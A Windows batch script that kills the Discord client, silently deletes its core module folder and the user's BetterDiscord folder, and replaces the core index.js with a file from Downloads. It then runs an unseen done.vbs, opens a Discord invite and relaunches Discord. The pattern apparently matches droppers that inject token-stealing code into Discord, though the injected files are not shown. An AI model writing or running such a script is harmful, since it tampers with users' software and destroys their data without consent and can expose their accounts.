@echo off
TASKKILL /IM discord.exe /F
del C:\Users\%USERNAME%\AppData\Roaming\discord\0.0.300\modules\discord_desktop_core\core /F /S /Q
rem Wait %3000%
XCOPY C:\Users\%USERNAME%\Downloads\index.js C:\Users\%USERNAME%\AppData\Roaming\discord\0.0.300\modules\discord_desktop_core /F /S /Q /Y      
rem Wait %5000%
del C:\Users\%USERNAME%\AppData\Roaming\BetterDiscord /F /S /Q
rem Wait %5000%
start C:\Users\%USERNAME%\Downloads\done.vbs
rem Wait %5000%
start iexplore.exe https://discordapp.com/invite/0Tmfo5ZbORBSfCjI
rem Wait %3000%
start C:\Users\%USERNAME%\AppData\Local\Discord\app-0.0.300\discord.exe
pause


